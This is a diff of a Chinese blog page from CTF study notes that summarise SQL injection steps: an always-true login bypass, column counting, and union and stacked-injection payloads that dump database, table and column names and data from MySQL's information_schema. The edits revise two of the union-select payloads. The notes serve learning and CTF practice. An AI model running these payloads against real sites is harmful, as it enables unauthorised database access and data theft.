@@ -15,7 +15,7 @@
 <meta property="og:description" content="到目前为止我也做了好多SQL注入的题了，但是每次做都觉得很混乱，整理一下看来是很有必要的。 目前我只接触到了回显注入、堆叠注入和宽字节注入，之后如果有新的再补充 一、常规步骤： PS:爆库&#x2F;表&#x2F;数据前要先确认回显点，并且在回显点查询的信息和数量要和字段数匹配才行 (-1)万能密码：1’ or 1&#x3D;1# (0)判断字符型还是数字型 (1)测试字段数 EG:1’ order by 1# PS:也可以联">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-10-14T11:34:25.000Z">
-<meta property="article:modified_time" content="2020-12-09T15:59:44.495Z">
+<meta property="article:modified_time" content="2021-04-19T14:41:49.919Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -101,13 +101,13 @@
 <p>联合查询:1’ union select 1,database() #</p>
 <p>堆叠注入:1’;show databases;#</p>
 <p>(3)爆表</p>
-<p>联合查询:1’ union select group_concat(table_name) from information_schema.tables where table_schema = ‘数据库名’#</p>
+<p>联合查询:1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ‘数据库名’)#</p>
 <p>学习:</p>
 <p>group_concat是一个拼接函数，他在这把所有表名拼在一起，这样回显出来就全都爆出来了</p>
 <p>而information_schema是一个mysql自带的表，它里面储存的是“元信息”，可以简单认为，他储存的信息是用来储存信息的，因此要查询储存的表信息当然需要from information_schema.tables。而table_schema更像是一个锁定器，用来锁定要查询的数据库的，他实际上就是表示表所在的数据库的一个参数。</p>
 <p>堆叠注入:1‘；show tables;#</p>
 <p>(4)爆出表中的列名</p>
-<p>联合查询:1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’表名’ and table_schema=’库名’ #</p>
+<p>联合查询:1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’表名’ and table_schema=’库名’) #</p>
 <p>堆叠注入:1’;show columns from 表名;#</p>
 <p>(5)爆出数据</p>
 <p>联合查询:1’ union select 列名1, 列名2 from 表名#</p>
@@ -173,7 +173,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckn4hz0qg0003b0v05z058191" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="cknopixix0004wsv036bo7qe3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -231,6 +231,14 @@
       <ul>
         
           <li>
+            <a href="/2021/04/18/BUUOJ-WEB-wp/">BUUOJ WEB-wp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/">关于网关、隧道和中继的理解</a>
+          </li>
+        
+          <li>
             <a href="/2021/04/05/%E5%85%B3%E4%BA%8EConnection%E9%A6%96%E9%83%A8%E5%92%8C%E5%93%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/">关于Connection首部和哑代理的问题</a>
           </li>
         
@@ -240,14 +248,6 @@
         
           <li>
             <a href="/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/">Hgame题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/23/bugku-web37%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%81%9A%E6%B3%95/">bugku-web37的时间盲注做法</a>
-          </li>
-        
-          <li>
-            <a href="/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/">异或注入中字符串的异或-sql的弱类型</a>
           </li>
         
       </ul>
